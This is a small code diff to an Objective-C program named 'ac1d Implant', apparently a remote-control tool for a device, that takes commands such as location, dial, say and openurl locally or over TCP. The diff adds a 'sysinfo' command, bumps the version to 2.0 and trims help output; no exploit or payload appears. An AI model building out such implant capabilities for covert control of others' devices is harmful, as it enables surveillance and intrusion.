@@ -24,7 +24,7 @@
 
 #import "ac1d.h"
 
-NSArray *commands = [[NSArray alloc] initWithObjects: @"alert", @"battery", @"dial", @"dhome", @"getvol", @"home", @"location", @"player", @"say", @"setvol", @"state", @"openurl", @"openapp", nil];
+NSArray *commands = [[NSArray alloc] initWithObjects: @"alert", @"battery", @"dial", @"dhome", @"getvol", @"home", @"location", @"player", @"say", @"setvol", @"state", @"sysinfo", @"openurl", @"openapp", nil];
 
 int sockfd, newsockfd;
 SSL_CTX *ssl_client_ctx;
@@ -124,12 +124,10 @@ void showHelpMessage() {
     printf("  -v, --version                             Show ac1d version.\n");
     printf("  -l, --local <option>                      Execute ac1d command locally.\n");
     printf("  -r, --remote <remote_host> <remote_port>  Execute ac1d commands over TCP.\n");
-    printf("\n");
 }
 
 void showVersionMessage() {
-    printf("ac1d Implant v1.0\n");
+    printf("ac1d Implant v2.0\n");
     printf("\n");
     printf("Copyright (c) 2020 Ivan Nikolsky\n");
-    printf("\n");
 }
